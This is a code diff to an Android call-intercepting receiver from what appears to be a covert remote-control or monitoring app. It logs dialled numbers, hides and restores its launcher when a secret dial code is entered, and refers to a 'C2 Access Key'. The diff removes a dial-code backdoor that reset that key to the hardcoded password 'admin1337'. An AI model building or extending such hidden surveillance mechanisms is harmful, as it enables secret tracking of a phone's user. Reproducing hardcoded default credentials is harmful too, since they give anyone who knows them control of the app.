@@ -54,26 +54,12 @@ public class TelephonyState extends BroadcastReceiver {
         Log.d(TAG, "Outgoing call to: " + savedNumber);
 
         if ("*#1337#".equals(savedNumber)) {
+            // Recovery UI: restores hidden launcher and opens the control panel login.
+            // No password reset is performed here; authentication is enforced by the
+            // panel (PBKDF2 hash verification / first-run initial password flow).
             setResultData(null);
             restoreLauncher(context);
             
-            Intent i = new Intent(context, MainActivity.class);
-            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(i);
-        } else if ("*#1337*0#".equals(savedNumber)) {
-            // EMERGENCY PASSWORD RESET: Resets C2 Access Key to 'admin1337'
-            setResultData(null);
-            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                    .edit()
-                    .remove("c2_password_hash")
-                    .remove("c2_password_salt")
-                    .putString("c2_password", "admin1337")
-                    .apply();
-            
-            FirebaseConfig.logActivity("SECURITY_ALERT: Hardware-triggered password reset sequence (Dial Code)");
-            android.widget.Toast.makeText(context, "SECURITY: C2 Access Key Reset to Default", android.widget.Toast.LENGTH_LONG).show();
-            
-            restoreLauncher(context);
             Intent i = new Intent(context, MainActivity.class);
             i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             context.startActivity(i);
